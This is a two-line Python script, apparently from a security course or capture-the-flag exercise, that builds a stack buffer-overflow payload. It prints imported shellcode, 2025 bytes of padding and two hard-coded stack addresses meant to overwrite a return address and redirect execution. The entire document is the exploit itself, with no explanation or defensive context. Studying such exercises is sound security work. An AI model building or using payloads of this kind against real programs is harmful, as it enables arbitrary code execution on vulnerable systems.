from shellcode import shellcode
print (shellcode+"a"*2025+"\x18\x95\xfe\xbf"+"\x2c\x9d\xfe\xbf")
